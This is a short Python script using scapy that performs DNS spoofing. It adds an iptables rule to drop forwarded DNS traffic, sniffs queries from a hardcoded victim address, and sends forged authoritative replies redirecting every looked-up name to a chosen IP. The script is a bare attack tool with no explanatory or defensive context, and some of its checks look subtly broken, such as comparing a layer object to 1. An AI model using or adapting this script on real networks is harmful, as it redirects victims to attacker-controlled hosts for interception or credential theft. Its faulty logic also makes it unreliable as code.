from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp
from subprocess import Popen, PIPE

victimIP = "10.5.1.2"
gotoIP = "10.5.1.3"

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
Popen([firewall], shell=True, stdout=PIPE)


while True:
    packet = sniff(count = 1, filter="udp and port 53 and host " + victimIP)
    if packet[0].src == victimIP and packet[0].getlayer(DNS) == 1 and DNSQR in packet:
        spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
        sendp(spoof, count=1)
    
